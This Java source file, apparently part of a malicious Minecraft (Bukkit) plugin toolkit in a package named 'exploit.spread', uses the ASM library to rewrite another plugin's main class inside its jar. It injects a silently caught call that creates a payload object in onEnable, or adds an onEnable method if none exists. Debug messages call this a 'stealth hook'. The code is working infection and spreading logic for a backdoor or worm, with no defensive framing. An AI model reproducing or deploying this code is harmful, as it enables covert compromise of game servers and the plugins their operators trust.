package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import org.objectweb.asm.*;

import java.nio.file.FileSystem;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public final class MainClassPatcher {

    private MainClassPatcher() {}

    private static class SafeClassWriter extends ClassWriter {
        public SafeClassWriter(ClassReader classReader, int flags) {
            super(classReader, flags);
        }

        @Override
        protected String getCommonSuperClass(final String type1, final String type2) {
            if ("java/lang/Object".equals(type1) || "java/lang/Object".equals(type2)) {
                return "java/lang/Object";
            }
            try {
                Class<?> c = Class.forName(type1.replace('/', '.'));
                Class<?> d = Class.forName(type2.replace('/', '.'));
                if (c.isAssignableFrom(d)) {
                    return type1;
                }
                if (d.isAssignableFrom(c)) {
                    return type2;
                }
                if (c.isInterface() || d.isInterface()) {
                    return "java/lang/Object";
                }
                Class<?> ancestor = c;
                do {
                    ancestor = ancestor.getSuperclass();
                } while (!ancestor.isAssignableFrom(d));
                return ancestor.getName().replace('.', '/');
            } catch (Exception e) {
                return "java/lang/Object";
            }
        }
    }

    public static void hook(FileSystem outStream, String mainClass, String finalPayloadFQN) throws Exception {
        Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (ASM): Starting main class hook process.");

        String mainClassPathStr = mainClass.replace('.', '/') + ".class";
        Path mainClassPath = outStream.getPath(mainClassPathStr);

        if (!Files.exists(mainClassPath)) {
            Exploit.sender.sendDebug(Level.SEVERE, "  |-> Main class file not found at: " + mainClassPath);
            return;
        }

        Exploit.sender.sendDebug(Level.INFO, "  |-> Reading class file: " + mainClassPath);
        byte[] classBytes = Files.readAllBytes(mainClassPath);

        ClassReader classReader = new ClassReader(classBytes);
        ClassWriter classWriter = new SafeClassWriter(classReader, ClassWriter.COMPUTE_FRAMES);

        ClassVisitor classVisitor = new OnEnableClassVisitor(classWriter, finalPayloadFQN);
        classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);

        Exploit.sender.sendDebug(Level.INFO, "  |-> Writing modified main class back to: " + mainClassPath);
        Files.write(mainClassPath, classWriter.toByteArray(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
        Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (ASM): Hooking process complete.");
    }

    private static void insertPayloadCall(MethodVisitor mv, String finalPayloadInternalName) {
        Label tryStart = new Label();
        Label tryEnd = new Label();
        Label catchHandler = new Label();
        Label exitPoint = new Label();

        mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");

        mv.visitLabel(tryStart);
        String pluginDescriptor = "Lorg/bukkit/plugin/Plugin;";
        String constructorDescriptor = "(" + pluginDescriptor + ")V";
        mv.visitTypeInsn(Opcodes.NEW, finalPayloadInternalName);
        mv.visitInsn(Opcodes.DUP);
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, finalPayloadInternalName, "<init>", constructorDescriptor, false);
        mv.visitInsn(Opcodes.POP);
        mv.visitLabel(tryEnd);

        mv.visitJumpInsn(Opcodes.GOTO, exitPoint);

        mv.visitLabel(catchHandler);
        mv.visitInsn(Opcodes.POP);

        mv.visitLabel(exitPoint);
    }

    private static class OnEnableClassVisitor extends ClassVisitor {
        private final String finalPayloadInternalName;
        private boolean onEnableMethodFound = false;

        public OnEnableClassVisitor(ClassVisitor classVisitor, String finalPayloadFQN) {
            super(Opcodes.ASM9, classVisitor);
            this.finalPayloadInternalName = finalPayloadFQN.replace('.', '/');
        }

        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
            if (mv != null && "onEnable".equals(name) && "()V".equals(descriptor)) {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Found 'onEnable' method. Applying stealth hook.");
                this.onEnableMethodFound = true;
                return new OnEnableMethodVisitor(mv, finalPayloadInternalName);
            }
            return mv;
        }

        @Override
        public void visitEnd() {
            if (!this.onEnableMethodFound) {
                Exploit.sender.sendDebug(Level.INFO, "  |-> 'onEnable' method not found. Creating a new one.");
                MethodVisitor mv = super.visitMethod(Opcodes.ACC_PUBLIC, "onEnable", "()V", null, null);
                mv.visitCode();
                insertPayloadCall(mv, this.finalPayloadInternalName);
                mv.visitInsn(Opcodes.RETURN);
                mv.visitMaxs(0, 0);
                mv.visitEnd();
            }
            super.visitEnd();
        }
    }

    private static class OnEnableMethodVisitor extends MethodVisitor {
        private final String finalPayloadInternalName;

        public OnEnableMethodVisitor(MethodVisitor methodVisitor, String finalPayloadInternalName) {
            super(Opcodes.ASM9, methodVisitor);
            this.finalPayloadInternalName = finalPayloadInternalName;
        }

        @Override
        public void visitInsn(int opcode) {
            if (opcode >= Opcodes.IRETURN && opcode <= Opcodes.RETURN) {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Injecting silent payload instantiation code before RETURN instruction.");
                insertPayloadCall(this.mv, this.finalPayloadInternalName);
            }
            super.visitInsn(opcode);
        }
    }
}